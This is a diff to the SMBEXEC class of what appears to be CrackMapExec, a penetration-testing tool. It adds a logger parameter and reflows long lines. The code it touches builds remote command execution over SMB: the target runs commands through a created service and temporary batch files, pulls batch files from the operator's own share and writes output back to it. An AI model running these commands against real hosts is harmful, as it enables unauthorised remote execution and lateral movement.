@@ -26,6 +26,7 @@ class SMBEXEC:
         hashes=None,
         share=None,
         port=445,
+        logger=cme_logger
     ):
         self.__host = host
         self.__share_name = "C$"
@@ -50,7 +51,7 @@ class SMBEXEC:
         self.__aesKey = aesKey
         self.__doKerberos = doKerberos
         self.__kdcHost = kdcHost
-        self.logger = cme_logger
+        self.logger = logger
 
         if hashes is not None:
             # This checks to see if we didn't provide the LM Hash
@@ -112,12 +113,7 @@ class SMBEXEC:
         self.__batchFile = gen_random_string(6) + ".bat"
 
         if self.__retOutput:
-            command = (
-                self.__shell
-                + "echo "
-                + data
-                + f" ^> \\\\127.0.0.1\\{self.__share_name}\\{self.__output} 2^>^&1 > %TEMP%\{self.__batchFile} & %COMSPEC% /Q /c %TEMP%\{self.__batchFile} & %COMSPEC% /Q /c del %TEMP%\{self.__batchFile}"
-            )
+            command = self.__shell + "echo " + data + f" ^> \\\\127.0.0.1\\{self.__share_name}\\{self.__output} 2^>^&1 > %TEMP%\{self.__batchFile} & %COMSPEC% /Q /c %TEMP%\{self.__batchFile} & %COMSPEC% /Q /c del %TEMP%\{self.__batchFile}"
         else:
             command = self.__shell + data
 
@@ -156,9 +152,7 @@ class SMBEXEC:
             return
         while True:
             try:
-                self.__smbconnection.getFile(
-                    self.__share, self.__output, self.output_callback
-                )
+                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)
                 break
             except Exception as e:
                 print(e)
@@ -178,11 +172,7 @@ class SMBEXEC:
         local_ip = self.__rpctransport.get_socket().getsockname()[0]
 
         if self.__retOutput:
-            command = (
-                self.__shell
-                + data
-                + f" ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}"
-            )
+            command = self.__shell + data + f" ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}"
         else:
             command = self.__shell + data
 
@@ -191,9 +181,7 @@ class SMBEXEC:
 
         self.logger.debug("Hosting batch file with command: " + command)
 
-        command = (
-            self.__shell + f"\\\\{local_ip}\\{self.__share_name}\\{self.__batchFile}"
-        )
+        command = self.__shell + f"\\\\{local_ip}\\{self.__share_name}\\{self.__batchFile}"
         self.logger.debug("Command to execute: " + command)
 
         self.logger.debug(f"Remote service {self.__serviceName} created.")
@@ -223,9 +211,7 @@ class SMBEXEC:
 
         while True:
             try:
-                with open(
-                    path_join("/tmp", "cme_hosted", self.__output), "rb"
-                ) as output:
+                with open(path_join("/tmp", "cme_hosted", self.__output), "rb") as output:
                     self.output_callback(output.read())
                 break
             except IOError:
